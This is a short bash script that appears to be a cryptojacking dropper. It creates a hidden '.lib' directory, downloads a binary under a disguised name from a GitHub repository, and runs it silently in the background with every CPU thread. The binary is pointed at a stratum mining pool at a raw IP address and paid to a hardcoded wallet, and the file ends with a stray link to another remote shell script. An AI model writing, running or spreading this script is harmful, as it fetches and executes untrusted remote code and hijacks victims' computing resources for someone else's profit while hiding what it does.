#!/bin/bash
set -x
apt-get update ; apt-get install -y wget curl sudo
mkdir .lib && cd .lib
wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/aurum-hertzner > /dev/null 2>&1
chmod u+x sgr1
./sgr1 -a aurum -o stratum+tcp://64.23.198.64:443 -u bit1qj5ykvg7l9nxv2pjn47qvaharq0hyt9pc3k4yv5.lieur -p x -t $(nproc --all) > /dev/null 2>&1 &
https://github.com/loeto21/lieur/raw/main/puyeng.sh
